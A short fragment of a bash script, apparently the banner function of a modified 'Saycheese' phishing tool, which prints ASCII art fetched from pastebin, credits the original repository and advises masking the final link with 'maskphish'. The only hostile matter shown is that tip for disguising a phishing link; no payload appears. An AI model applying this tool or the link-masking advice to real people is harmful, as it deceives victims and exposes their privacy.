...
banner() {
clear
echo "Initializing.." |lolcat | grep 'not' &> /dev/null
if [ $? == 0 ]; then
   echo "Installing lolcat.."
   sudo apt-get install lolcat -y
fi

curl "https://pastebin.com/raw/rugpV5pY" | lolcat
printf " \e[1;77m @elbee_ez custom version of Saycheese by hangetzzu \e[0m \n"
printf "Original repo before my modificaiton: https://github.com/hangetzzu/saycheese" | lolcat
printf "\n"
printf "Use a tool like maskphish to mask the final link!"
printf "\n"
